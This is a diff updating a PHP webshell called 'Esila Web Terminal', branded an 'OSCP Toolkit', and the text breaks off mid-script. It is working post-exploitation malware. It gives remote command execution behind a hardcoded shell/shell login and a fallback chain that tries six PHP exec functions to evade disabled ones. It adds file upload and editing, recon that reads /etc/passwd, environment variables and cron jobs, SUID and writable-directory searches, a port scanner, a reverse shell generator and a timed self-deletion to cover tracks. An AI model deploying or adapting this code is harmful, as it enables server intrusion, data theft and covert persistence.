@@ -1,17 +1,49 @@
 <?php
 $php_works = true;
-session_start();
 error_reporting(0);
 
+// PHP 5.6+ polyfills
+if (!function_exists('str_contains')) { function str_contains($h,$n){return $n===''||strpos($h,$n)!==false;} }
+if (!function_exists('str_starts_with')) { function str_starts_with($h,$n){return $n===''||strncmp($h,$n,strlen($n))===0;} }
+if (!function_exists('array_key_first')) { function array_key_first($a){foreach($a as $k=>$v)return $k;return null;} }
+
+// Session hardening
+if(!headers_sent()){@session_start();}
+if(!isset($_SESSION)){$_SESSION=array();}
+
+define('IS_WIN', strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
 define('DEFAULT_USER', 'shell');
 define('DEFAULT_PASS', 'shell');
-define('VERSION', '2.0');
+define('VERSION', '2.1');
+
+// Universal command execution - tries multiple methods
+function esila_exec($cmd) {
+    $out = '';
+    $disabled = array_map('trim', explode(',', @ini_get('disable_functions')));
+    if (function_exists('shell_exec') && !in_array('shell_exec', $disabled)) {
+        $out = @shell_exec($cmd);
+    } elseif (function_exists('exec') && !in_array('exec', $disabled)) {
+        @exec($cmd, $arr); $out = implode("\n", $arr);
+    } elseif (function_exists('system') && !in_array('system', $disabled)) {
+        ob_start(); @system($cmd); $out = ob_get_clean();
+    } elseif (function_exists('passthru') && !in_array('passthru', $disabled)) {
+        ob_start(); @passthru($cmd); $out = ob_get_clean();
+    } elseif (function_exists('proc_open') && !in_array('proc_open', $disabled)) {
+        $desc = array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));
+        $p = @proc_open($cmd, $desc, $pipes);
+        if (is_resource($p)) { $out = stream_get_contents($pipes[1]).stream_get_contents($pipes[2]); fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]); proc_close($p); }
+    } elseif (function_exists('popen') && !in_array('popen', $disabled)) {
+        $p = @popen($cmd, 'r');
+        if (is_resource($p)) { $out = stream_get_contents($p); pclose($p); }
+    }
+    return ($out !== null && $out !== false) ? $out : '';
+}
 
 // .htaccess fix endpoint
 if (isset($_POST['action']) && $_POST['action'] === 'fix_htaccess') {
     header('Content-Type: application/json');
     $dir = dirname(__FILE__);
-    $mode = $_POST['mode'] ?? 'module';
+    $mode = isset($_POST['mode']) ? $_POST['mode'] : 'module';
     if ($mode === 'cgi') {
         $content = "Options +ExecCGI\nAddHandler cgi-script .php\n";
     } else {
@@ -27,11 +59,15 @@ if (isset($_POST['action']) && $_POST['action'] === 'fix_htaccess') {
 // Self destruct
 if (isset($_POST['action']) && $_POST['action'] === 'self_destruct') {
     header('Content-Type: application/json');
-    $minutes = intval($_POST['minutes'] ?? 0);
+    $minutes = intval(isset($_POST['minutes']) ? $_POST['minutes'] : 0);
     if ($minutes > 0 && $minutes <= 1440) {
         $delay = $minutes * 60;
         $self = __FILE__;
-        shell_exec("nohup bash -c 'sleep $delay && rm -f " . escapeshellarg($self) . "' >/dev/null 2>&1 &");
+        if (IS_WIN) {
+            esila_exec("start /b cmd /c \"timeout /t $delay /nobreak >nul & del /f " . escapeshellarg($self) . "\"");
+        } else {
+            esila_exec("nohup bash -c 'sleep $delay && rm -f " . escapeshellarg($self) . "' >/dev/null 2>&1 &");
+        }
         echo json_encode(['ok' => true, 'msg' => "Self destruct in $minutes minutes"]);
     } else {
         echo json_encode(['ok' => false, 'msg' => 'Invalid minutes (1-1440)']);
@@ -60,7 +96,8 @@ if (!isset($_SESSION['logged_in'])) {
         if ($_POST['username'] === DEFAULT_USER && $_POST['password'] === DEFAULT_PASS) {
             $_SESSION['logged_in'] = true;
             $_SESSION['cwd'] = getcwd();
-            $_SESSION['history'] = [];
+            $_SESSION['history'] = array();
+            @setcookie('esila_auth', md5(DEFAULT_USER . ':' . DEFAULT_PASS), time() + 86400, '/');
             header('Location: ?');
             exit;
         } else {
@@ -117,15 +154,12 @@ document.addEventListener('DOMContentLoaded', function() {
 });
 function fixHtaccess(mode) {
     var status = document.getElementById('fix-status');
-    status.textContent = 'Attempting fix (' + mode + ')...';
-    fetch(window.location.href, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        body: 'action=fix_htaccess&mode=' + mode
-    }).then(function(r) { return r.json(); }).then(function(d) {
-        if (d.ok) { status.textContent = 'Fix applied! Reloading...'; setTimeout(function(){ location.reload(); }, 1000); }
-        else { status.textContent = 'Failed to write .htaccess. Try manually.'; status.style.color = '#f85149'; }
-    }).catch(function() { status.textContent = 'Request failed. PHP may not be running at all.'; status.style.color = '#f85149'; });
+    if (mode === 'module') {
+        status.innerHTML = '<strong>Create .htaccess manually with this content:</strong><br><code style="display:block;background:#0d1117;padding:8px;margin:8px 0;border-radius:6px;font-size:12px;text-align:left">AddHandler application/x-httpd-php .php\nAddType application/x-httpd-php .php .php5 .php7 .phtml\n&lt;FilesMatch "\\.php$"&gt;\n  SetHandler application/x-httpd-php\n&lt;/FilesMatch&gt;</code>';
+    } else {
+        status.innerHTML = '<strong>Create .htaccess manually with this content:</strong><br><code style="display:block;background:#0d1117;padding:8px;margin:8px 0;border-radius:6px;font-size:12px;text-align:left">Options +ExecCGI\nAddHandler cgi-script .php</code>';
+    }
+    status.style.color = '#d29922';
 }
 </script>
 <div class="login-box">
@@ -186,7 +220,7 @@ if (isset($_POST['cmd'])) {
     $_SESSION['history'][] = $cmd;
     if (preg_match('/^\s*cd\s*(.*)$/', $cmd, $m)) {
         $target = trim($m[1]);
-        if ($target === '' || $target === '~') $new = getenv('HOME') ?: '/root';
+        if ($target === '' || $target === '~') $new = getenv('HOME') ?: (getenv('USERPROFILE') ?: (IS_WIN ? 'C:\\' : '/root'));
         elseif ($target[0] === '/') $new = realpath($target);
         else $new = realpath($cwd . '/' . $target);
         if ($new && is_dir($new)) {
@@ -197,15 +231,19 @@ if (isset($_POST['cmd'])) {
         }
         exit;
     }
-    $exec = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
-    echo shell_exec($exec);
+    if (IS_WIN) {
+        $exec = "cd /d " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
+    } else {
+        $exec = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
+    }
+    echo esila_exec($exec);
     exit;
 }
 
 // Upload
 if (isset($_FILES['upload'])) {
     header('Content-Type: application/json');
-    $dest = ($_POST['upload_path'] ?? $cwd) . '/' . basename($_FILES['upload']['name']);
+    $dest = (isset($_POST['upload_path']) ? $_POST['upload_path'] : $cwd) . '/' . basename($_FILES['upload']['name']);
     echo json_encode(['ok' => move_uploaded_file($_FILES['upload']['tmp_name'], $dest), 'name' => basename($dest)]);
     exit;
 }
@@ -213,7 +251,7 @@ if (isset($_FILES['upload'])) {
 // File manager API
 if (isset($_POST['action']) && $_POST['action'] === 'filemanager') {
     header('Content-Type: application/json');
-    $path = $_POST['path'] ?? $cwd;
+    $path = isset($_POST['path']) ? $_POST['path'] : $cwd;
     if (!is_dir($path)) { echo json_encode(['error' => 'Not a directory']); exit; }
     $items = [];
     foreach (@scandir($path) as $f) {
@@ -238,17 +276,17 @@ if (isset($_POST['action']) && $_POST['action'] === 'filemanager') {
 // File actions
 if (isset($_POST['action']) && $_POST['action'] === 'fileaction') {
     header('Content-Type: application/json');
-    $type = $_POST['type'] ?? '';
-    $path = $_POST['path'] ?? '';
+    $type = isset($_POST['type']) ? $_POST['type'] : '';
+    $path = isset($_POST['path']) ? $_POST['path'] : '';
     switch ($type) {
         case 'delete':
             echo json_encode(['ok' => is_dir($path) ? @rmdir($path) : @unlink($path)]);
             break;
         case 'rename':
-            echo json_encode(['ok' => @rename($path, dirname($path) . '/' . basename($_POST['newname'] ?? ''))]);
+            echo json_encode(['ok' => @rename($path, dirname($path) . '/' . basename(isset($_POST['newname']) ? $_POST['newname'] : ''))]);
             break;
         case 'chmod':
-            echo json_encode(['ok' => @chmod($path, octdec($_POST['mode'] ?? '0644'))]);
+            echo json_encode(['ok' => @chmod($path, octdec(isset($_POST['mode']) ? $_POST['mode'] : '0644'))]);
             break;
         case 'read':
             if (is_file($path) && is_readable($path) && filesize($path) < 2097152) {
@@ -258,7 +296,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'fileaction') {
             }
             break;
         case 'write':
-            echo json_encode(['ok' => @file_put_contents($path, $_POST['content'] ?? '') !== false]);
+            echo json_encode(['ok' => @file_put_contents($path, isset($_POST['content']) ? $_POST['content'] : '') !== false]);
             break;
         case 'mkdir':
             echo json_encode(['ok' => @mkdir($path, 0755, true)]);
@@ -272,25 +310,47 @@ if (isset($_POST['action']) && $_POST['action'] === 'fileaction') {
 // System info
 if (isset($_POST['action']) && $_POST['action'] === 'sysinfo') {
     header('Content-Type: application/json');
-    $info = [
-        'os' => php_uname(),
-        'kernel' => php_uname('r'),
-        'hostname' => gethostname(),
-        'user' => trim(shell_exec('whoami 2>/dev/null')),
-        'uid' => trim(shell_exec('id 2>/dev/null')),
-        'groups' => trim(shell_exec('groups 2>/dev/null')),
-        'ip_addrs' => trim(shell_exec("hostname -I 2>/dev/null || ifconfig 2>/dev/null | grep 'inet ' | awk '{print \$2}'")),
-        'uptime' => trim(shell_exec('uptime 2>/dev/null')),
-        'disk' => trim(shell_exec('df -h 2>/dev/null')),
-        'interfaces' => trim(shell_exec('ip -br addr 2>/dev/null || ifconfig 2>/dev/null')),
-        'env' => trim(shell_exec('env 2>/dev/null')),
-        'processes' => trim(shell_exec('ps aux --sort=-%mem 2>/dev/null | head -30')),
-        'passwd' => @file_get_contents('/etc/passwd'),
-        'crontab' => trim(shell_exec('crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null')),
-        'php_ver' => phpversion(),
-        'php_disabled' => ini_get('disable_functions'),
-        'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
-    ];
+    if (IS_WIN) {
+        $info = [
+            'os' => php_uname(),
+            'kernel' => php_uname('r'),
+            'hostname' => gethostname(),
+            'user' => trim(esila_exec('whoami 2>nul')),
+            'uid' => trim(esila_exec('whoami /priv 2>nul')),
+            'groups' => trim(esila_exec('whoami /groups 2>nul')),
+            'ip_addrs' => trim(esila_exec('ipconfig 2>nul')),
+            'uptime' => trim(esila_exec('net stats srv 2>nul | findstr "since"')),
+            'disk' => trim(esila_exec('wmic logicaldisk get caption,size,freespace 2>nul')),
+            'interfaces' => trim(esila_exec('ipconfig /all 2>nul')),
+            'env' => trim(esila_exec('set 2>nul')),
+            'processes' => trim(esila_exec('tasklist /V 2>nul')),
+            'passwd' => 'N/A on Windows',
+            'crontab' => trim(esila_exec('schtasks /query 2>nul')),
+            'php_ver' => phpversion(),
+            'php_disabled' => ini_get('disable_functions'),
+            'server_software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'unknown',
+        ];
+    } else {
+        $info = [
+            'os' => php_uname(),
+            'kernel' => php_uname('r'),
+            'hostname' => gethostname(),
+            'user' => trim(esila_exec('whoami 2>/dev/null')),
+            'uid' => trim(esila_exec('id 2>/dev/null')),
+            'groups' => trim(esila_exec('groups 2>/dev/null')),
+            'ip_addrs' => trim(esila_exec("hostname -I 2>/dev/null || ifconfig 2>/dev/null | grep 'inet ' | awk '{print \$2}'")),
+            'uptime' => trim(esila_exec('uptime 2>/dev/null')),
+            'disk' => trim(esila_exec('df -h 2>/dev/null')),
+            'interfaces' => trim(esila_exec('ip -br addr 2>/dev/null || ifconfig 2>/dev/null')),
+            'env' => trim(esila_exec('env 2>/dev/null')),
+            'processes' => trim(esila_exec('ps aux --sort=-%mem 2>/dev/null | head -30')),
+            'passwd' => @file_get_contents('/etc/passwd'),
+            'crontab' => trim(esila_exec('crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null')),
+            'php_ver' => phpversion(),
+            'php_disabled' => ini_get('disable_functions'),
+            'server_software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'unknown',
+        ];
+    }
     echo json_encode($info);
     exit;
 }
@@ -298,31 +358,58 @@ if (isset($_POST['action']) && $_POST['action'] === 'sysinfo') {
 // SUID finder
 if (isset($_POST['action']) && $_POST['action'] === 'find_suid') {
     header('Content-Type: application/json');
-    echo json_encode(['result' => trim(shell_exec('find / -perm -4000 -type f 2>/dev/null | head -50'))]);
+    if (IS_WIN) {
+        echo json_encode(['result' => 'SUID is a Linux concept. On Windows, check: icacls, accesschk, or service permissions.']);
+    } else {
+        echo json_encode(['result' => trim(esila_exec('find / -perm -4000 -type f 2>/dev/null | head -50'))]);
+    }
     exit;
 }
 
 // Writable dirs finder
 if (isset($_POST['action']) && $_POST['action'] === 'find_writable') {
     header('Content-Type: application/json');
-    echo json_encode(['result' => trim(shell_exec('find / -writable -type d 2>/dev/null | head -50'))]);
+    if (IS_WIN) {
+        echo json_encode(['result' => trim(esila_exec('icacls C:\\ /findsid Everyone /T 2>nul | findstr /I "Everyone" | head -50'))]);
+    } else {
+        echo json_encode(['result' => trim(esila_exec('find / -writable -type d 2>/dev/null | head -50'))]);
+    }
     exit;
 }
 
 // Network tools
 if (isset($_POST['action']) && $_POST['action'] === 'nettool') {
     header('Content-Type: application/json');
-    $tool = $_POST['tool'] ?? '';
-    $target = $_POST['target'] ?? '';
+    $tool = isset($_POST['tool']) ? $_POST['tool'] : '';
+    $target = isset($_POST['target']) ? $_POST['target'] : '';
     $target = preg_replace('/[^a-zA-Z0-9.\-:\/]/', '', $target);
     $out = '';
+    $t = escapeshellarg($target);
     switch ($tool) {
-        case 'ping': $out = shell_exec("ping -c 4 " . escapeshellarg($target) . " 2>&1"); break;
-        case 'portscan': $out = shell_exec("(for p in 21 22 23 25 53 80 110 111 135 139 143 443 445 993 995 1433 1723 3306 3389 5432 5900 8080 8443; do (echo >/dev/tcp/" . escapeshellarg($target) . "/\$p) 2>/dev/null && echo \"Port \$p: OPEN\"; done) 2>&1"); break;
-        case 'traceroute': $out = shell_exec("traceroute " . escapeshellarg($target) . " 2>&1 || tracepath " . escapeshellarg($target) . " 2>&1"); break;
-        case 'dns': $out = shell_exec("nslookup " . escapeshellarg($target) . " 2>&1 || dig " . escapeshellarg($target) . " 2>&1 || host " . escapeshellarg($target) . " 2>&1"); break;
-        case 'arp': $out = shell_exec("arp -a 2>&1"); break;
-        case 'curl': $out = shell_exec("curl -sI " . escapeshellarg($target) . " 2>&1"); break;
+        case 'ping':
+            $out = esila_exec(IS_WIN ? "ping -n 4 $t 2>&1" : "ping -c 4 $t 2>&1");
+            break;
+        case 'portscan':
+            $ports = array(21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1723,3306,3389,5432,5900,8080,8443);
+            $result = '';
+            foreach ($ports as $p) {
+                $fp = @fsockopen($target, $p, $errno, $errstr, 1);
+                if ($fp) { $result .= "Port $p: OPEN\n"; fclose($fp); }
+            }
+            $out = $result ? $result : "No open ports found on common ports.";
+            break;
+        case 'traceroute':
+            $out = esila_exec(IS_WIN ? "tracert $t 2>&1" : "traceroute $t 2>&1 || tracepath $t 2>&1");
+            break;
+        case 'dns':
+            $out = esila_exec(IS_WIN ? "nslookup $t 2>&1" : "nslookup $t 2>&1 || dig $t 2>&1 || host $t 2>&1");
+            break;
+        case 'arp':
+            $out = esila_exec("arp -a 2>&1");
+            break;
+        case 'curl':
+            $out = esila_exec("curl -sI $t 2>&1");
+            break;
     }
     echo json_encode(['result' => $out]);
     exit;
@@ -336,9 +423,9 @@ if (isset($_POST['action']) && $_POST['action'] === 'chpass') {
 }
 
 // Collect page data
-$username = trim(shell_exec('whoami 2>/dev/null'));
-$hostname = trim(shell_exec('hostname 2>/dev/null'));
-$home = getenv('HOME') ?: '/root';
+$username = trim(esila_exec(IS_WIN ? 'whoami 2>nul' : 'whoami 2>/dev/null')) ?: (function_exists('get_current_user') ? get_current_user() : 'unknown');
+$hostname = trim(esila_exec(IS_WIN ? 'hostname 2>nul' : 'hostname 2>/dev/null')) ?: (function_exists('gethostname') ? gethostname() : 'unknown');
+$home = getenv('HOME') ?: (getenv('USERPROFILE') ?: (IS_WIN ? 'C:\\' : '/root'));
 $history = $_SESSION['history'];
 ?>
 <!DOCTYPE html>
@@ -630,7 +717,18 @@ select.input { cursor:pointer; }
         <span class="panel-title">Reverse Shell Generator</span>
         <div class="spacer"></div>
         <label style="font-size:13px;color:var(--text-secondary)">IP</label>
-        <input class="input input-sm" id="rs-ip" value="<?= htmlspecialchars(trim(shell_exec("hostname -I 2>/dev/null | awk '{print $1}'"))) ?: '10.10.10.10' ?>" style="width:130px">
+        <?php
+        $_ip = '';
+        if (!IS_WIN) {
+            $_ip = trim(esila_exec("hostname -I 2>/dev/null | awk '{print \$1}'"));
+            if (!$_ip) $_ip = trim(esila_exec("ifconfig 2>/dev/null | grep -oP 'inet \\K[\\d.]+' | grep -v '127.0.0.1' | head -1"));
+        } else {
+            $_ip = trim(esila_exec("powershell -c \"(Get-NetIPAddress -AddressFamily IPv4 | Where-Object { \$_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1).IPAddress\" 2>nul"));
+        }
+        if (!$_ip || $_ip === '127.0.0.1') $_ip = @gethostbyname(@gethostname());
+        if (!$_ip || $_ip === gethostname()) $_ip = '10.10.10.10';
+        ?>
+        <input class="input input-sm" id="rs-ip" value="<?= htmlspecialchars($_ip) ?>" style="width:130px">
         <label style="font-size:13px;color:var(--text-secondary)">Port</label>
         <input class="input input-sm" id="rs-port" value="4444" style="width:70px">
         <label style="font-size:13px;color:var(--text-secondary)">Shell</label>
@@ -766,6 +864,23 @@ select.input { cursor:pointer; }
                 <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">PHP version: <?= phpversion() ?></p>
                 <a href="?logout" class="btn btn-danger" style="text-decoration:none;display:inline-block;margin-top:8px">Logout</a>
             </div>
+            <div class="card">
+                <h3 style="margin-bottom:16px">Environment</h3>
+                <?php
+                $disabled = array_map('trim', explode(',', @ini_get('disable_functions')));
+                $exec_methods = array('shell_exec','exec','system','passthru','proc_open','popen');
+                $available_exec = array();
+                foreach ($exec_methods as $fn) {
+                    if (function_exists($fn) && !in_array($fn, $disabled)) $available_exec[] = $fn;
+                }
+                ?>
+                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:4px">OS: <span style="color:var(--text)"><?= IS_WIN ? 'Windows' : 'Linux/Unix' ?> (<?= PHP_OS ?>)</span></p>
+                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:4px">PHP: <span style="color:var(--text)"><?= phpversion() ?></span></p>
+                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:4px">Server: <span style="color:var(--text)"><?= htmlspecialchars(isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'unknown') ?></span></p>
+                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:4px">Exec methods: <span style="color:<?= count($available_exec) ? 'var(--green)' : 'var(--red)' ?>"><?= count($available_exec) ? implode(', ', $available_exec) : 'NONE AVAILABLE' ?></span></p>
+                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:4px">Terminal: <span style="color:var(--text)" id="env-terminal-mode">Checking...</span></p>
+                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:4px">Disabled functions: <span style="color:var(--orange);font-size:11px"><?= htmlspecialchars(ini_get('disable_functions') ?: 'none') ?></span></p>
+            </div>
             <div class="card" style="border-color:rgba(248,81,73,0.3)">
                 <h3 style="margin-bottom:16px;color:var(--red)">Danger Zone</h3>
                 <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">Self-destruct: delete this webshell after a delay.</p>
@@ -798,11 +913,12 @@ select.input { cursor:pointer; }
 <!-- Toast -->
 <div class="toast" id="toast"></div>
 
-<!-- xterm.js -->
-<script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.js"></script>
+<!-- xterm.js with CDN fallback -->
+<script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.js" onerror="window._xtermFailed=true"></script>
+<script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.js" onerror="window._xtermFitFailed=true"></script>
 
 <script>
+var XTERM_AVAILABLE = (typeof Terminal !== 'undefined' && !window._xtermFailed);
 // ===== GLOBALS =====
 const USERNAME = <?= json_encode($username) ?>;
 const HOSTNAME = <?= json_encode($hostname) ?>;
@@ -838,10 +954,10 @@ async function api(data) {
 }
 async function apiJson(data) { return (await api(data)).json(); }
 async function apiText(data) { return (await api(data)).text(); }
-function formatPath(p) { return p === HOME ? '~' : (p.startsWith(HOME + '/') ? '~' + p.substring(HOME.length) : p); }
+function formatPath(p) { return p === HOME ? '~' : ((p.startsWith(HOME + '/') || p.startsWith(HOME + '\\')) ? '~' + p.substring(HOME.length) : p); }
 
 // ===== SIDEBAR =====
-function toggleSidebar() { $('sidebar').classList.toggle('collapsed'); setTimeout(() => fit.fit(), 300); }
+function toggleSidebar() { $('sidebar').classList.toggle('collapsed'); if(XTERM_AVAILABLE) setTimeout(function(){ fit.fit(); }, 300); }
 function toggleMobileSidebar() { $('sidebar').classList.toggle('mobile-open'); $('mobileOverlay').classList.toggle('show'); }
 
 // ===== PANEL SWITCHING =====
@@ -850,84 +966,133 @@ function switchPanel(name) {
     document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
     $('panel-' + name).classList.add('active');
     document.querySelector(`.nav-item[data-panel="${name}"]`).classList.add('active');
-    if (name === 'terminal') setTimeout(() => fit.fit(), 100);
+    if (name === 'terminal' && XTERM_AVAILABLE) setTimeout(function(){ fit.fit(); }, 100);
     if (name === 'filemanager') loadFileManager(fmCurrentPath);
     $('mobileOverlay').classList.remove('show');
     $('sidebar').classList.remove('mobile-open');
 }
 
-// ===== TERMINAL =====
-const term = new Terminal({
-    cursorBlink: true, fontSize: 14, fontFamily: "'SF Mono','Fira Code','Cascadia Code',monospace",
-    theme: { background:'#010409', foreground:'#e6edf3', cursor:'#007AFF', selectionBackground:'rgba(0,122,255,0.3)', black:'#0d1117', red:'#f85149', green:'#3fb950', yellow:'#d29922', blue:'#79c0ff', magenta:'#bc8cff', cyan:'#56d4dd', white:'#e6edf3' },
-    convertEol: true, scrollback: 5000
-});
-const fit = new FitAddon.FitAddon();
-term.loadAddon(fit);
-term.open($('terminal-container'));
-setTimeout(() => fit.fit(), 50);
-window.addEventListener('resize', () => fit.fit());
+// ===== TERMINAL (with CDN fallback) =====
+var term, fit;
 
 function getPrompt() {
-    return `\r\n\x1b[1;38;2;0;122;255m${USERNAME}\x1b[0m@\x1b[1;38;2;188;140;255m${HOSTNAME}\x1b[0m:\x1b[1;38;2;63;185;80m${formatPath(CWD)}\x1b[0m$ `;
-}
-term.writeln('\x1b[1;38;2;0;122;255m  ___        _ _       \x1b[0m');
-term.writeln('\x1b[1;38;2;0;122;255m | __|  ___ (_) | __ _ \x1b[0m');
-term.writeln('\x1b[1;38;2;88;86;214m | _|  (_-< | | |/ _` |\x1b[0m');
-term.writeln('\x1b[1;38;2;188;140;255m |___| /__/ |_|_|\\__,_|\x1b[0m');
-term.writeln('\x1b[38;2;139;148;158m  Web Terminal v<?= VERSION ?> | OSCP Toolkit\x1b[0m');
-term.write(getPrompt());
-
-term.onData(e => {
-    switch (e) {
-        case '\t':
-            fetch('', { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'autocomplete=' + encodeURIComponent(currentLine) })
-            .then(r=>r.text()).then(data => {
-                const opts = data.trim().split('\n').filter(Boolean);
-                const lastWord = currentLine.split(/\s+/).pop();
-                if (opts.length === 1) { const add = opts[0].substring(lastWord.length); currentLine += add; term.write(add); }
-                else if (opts.length > 1) { term.write('\r\n' + opts.join('  ')); term.write(getPrompt() + currentLine); }
-            });
-            break;
-        case '\r':
-            if (!currentLine.trim()) { term.write(getPrompt()); currentLine = ''; return; }
-            const input = currentLine;
-            cmdHistory.push(input); historyIdx = cmdHistory.length;
-            if (input.trim() === 'clear') { term.clear(); term.write(getPrompt()); currentLine = ''; return; }
-            fetch(window.location.href, { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'cmd=' + encodeURIComponent(input) })
-            .then(r=>r.text()).then(out => {
-                if (out.startsWith('__CWD__:')) { CWD = out.replace('__CWD__:','').trim(); }
-                else { term.write('\r\n' + out); }
-                term.write(getPrompt());
-            });
-            currentLine = ''; break;
-        case '\u007F':
-            if (currentLine.length) { currentLine = currentLine.slice(0,-1); term.write('\b \b'); }
-            break;
-        case '\u001b[A':
-            if (historyIdx > 0) { historyIdx--; eraseLine(); currentLine = cmdHistory[historyIdx]; term.write(currentLine); }
-            break;
-        case '\u001b[B':
-            if (historyIdx < cmdHistory.length - 1) { historyIdx++; eraseLine(); currentLine = cmdHistory[historyIdx]; term.write(currentLine); }
-            else { eraseLine(); currentLine = ''; historyIdx = cmdHistory.length; }
-            break;
-        case '\u0003': term.write('^C'); currentLine = ''; term.write(getPrompt()); break;
-        case '\u000c': term.clear(); term.write(getPrompt()); currentLine = ''; break;
-        default:
-            if (e >= ' ') { currentLine += e; term.write(e); }
+    if (XTERM_AVAILABLE) {
+        return `\r\n\x1b[1;38;2;0;122;255m${USERNAME}\x1b[0m@\x1b[1;38;2;188;140;255m${HOSTNAME}\x1b[0m:\x1b[1;38;2;63;185;80m${formatPath(CWD)}\x1b[0m$ `;
     }
-});
-function eraseLine() { for (let i = 0; i < currentLine.length; i++) term.write('\b \b'); }
-function termClear() { term.clear(); term.write(getPrompt()); currentLine = ''; }
+    return USERNAME + '@' + HOSTNAME + ':' + formatPath(CWD) + '$ ';
+}
+
+if (XTERM_AVAILABLE) {
+    term = new Terminal({
+        cursorBlink: true, fontSize: 14, fontFamily: "'SF Mono','Fira Code','Cascadia Code',monospace",
+        theme: { background:'#010409', foreground:'#e6edf3', cursor:'#007AFF', selectionBackground:'rgba(0,122,255,0.3)', black:'#0d1117', red:'#f85149', green:'#3fb950', yellow:'#d29922', blue:'#79c0ff', magenta:'#bc8cff', cyan:'#56d4dd', white:'#e6edf3' },
+        convertEol: true, scrollback: 5000
+    });
+    fit = new FitAddon.FitAddon();
+    term.loadAddon(fit);
+    term.open($('terminal-container'));
+    setTimeout(function(){ fit.fit(); }, 50);
+    window.addEventListener('resize', function(){ fit.fit(); });
+    term.writeln('\x1b[1;38;2;0;122;255m  ___        _ _       \x1b[0m');
+    term.writeln('\x1b[1;38;2;0;122;255m | __|  ___ (_) | __ _ \x1b[0m');
+    term.writeln('\x1b[1;38;2;88;86;214m | _|  (_-< | | |/ _` |\x1b[0m');
+    term.writeln('\x1b[1;38;2;188;140;255m |___| /__/ |_|_|\\__,_|\x1b[0m');
+    term.writeln('\x1b[38;2;139;148;158m  Web Terminal v<?= VERSION ?> | OSCP Toolkit\x1b[0m');
+    term.write(getPrompt());
+
+    term.onData(function(e) {
+        switch (e) {
+            case '\t':
+                fetch('', { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'autocomplete=' + encodeURIComponent(currentLine) })
+                .then(function(r){return r.text()}).then(function(data) {
+                    var opts = data.trim().split('\n').filter(Boolean);
+                    var lastWord = currentLine.split(/\s+/).pop();
+                    if (opts.length === 1) { var add = opts[0].substring(lastWord.length); currentLine += add; term.write(add); }
+                    else if (opts.length > 1) { term.write('\r\n' + opts.join('  ')); term.write(getPrompt() + currentLine); }
+                });
+                break;
+            case '\r':
+                if (!currentLine.trim()) { term.write(getPrompt()); currentLine = ''; return; }
+                var input = currentLine;
+                cmdHistory.push(input); historyIdx = cmdHistory.length;
+                if (input.trim() === 'clear') { term.clear(); term.write(getPrompt()); currentLine = ''; return; }
+                fetch(window.location.href, { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'cmd=' + encodeURIComponent(input) })
+                .then(function(r){return r.text()}).then(function(out) {
+                    if (out.indexOf('__CWD__:') === 0) { CWD = out.replace('__CWD__:','').trim(); }
+                    else { term.write('\r\n' + out); }
+                    term.write(getPrompt());
+                });
+                currentLine = ''; break;
+            case '\u007F':
+                if (currentLine.length) { currentLine = currentLine.slice(0,-1); term.write('\b \b'); }
+                break;
+            case '\u001b[A':
+                if (historyIdx > 0) { historyIdx--; eraseLine(); currentLine = cmdHistory[historyIdx]; term.write(currentLine); }
+                break;
+            case '\u001b[B':
+                if (historyIdx < cmdHistory.length - 1) { historyIdx++; eraseLine(); currentLine = cmdHistory[historyIdx]; term.write(currentLine); }
+                else { eraseLine(); currentLine = ''; historyIdx = cmdHistory.length; }
+                break;
+            case '\u0003': term.write('^C'); currentLine = ''; term.write(getPrompt()); break;
+            case '\u000c': term.clear(); term.write(getPrompt()); currentLine = ''; break;
+            default:
+                if (e >= ' ') { currentLine += e; term.write(e); }
+        }
+    });
+} else {
+    // Fallback: plain textarea terminal when CDN is unreachable
+    var container = $('terminal-container');
+    container.innerHTML = '<style>#fallback-term{width:100%;height:100%;background:#010409;color:#e6edf3;font-family:monospace;font-size:14px;border:none;padding:12px;resize:none;outline:none;white-space:pre-wrap;overflow-y:auto}#fallback-input{width:100%;background:#0d1117;color:#3fb950;font-family:monospace;font-size:14px;border:none;border-top:1px solid rgba(255,255,255,0.08);padding:8px 12px;outline:none}</style>' +
+        '<textarea id="fallback-term" readonly></textarea>' +
+        '<input id="fallback-input" type="text" placeholder="Type command..." autofocus>';
+    var fbTerm = $('fallback-term');
+    var fbInput = $('fallback-input');
+    fbTerm.value = '  Esila Web Terminal v<?= VERSION ?> | OSCP Toolkit\n  (Fallback mode - no internet/CDN)\n\n' + getPrompt();
+    term = {
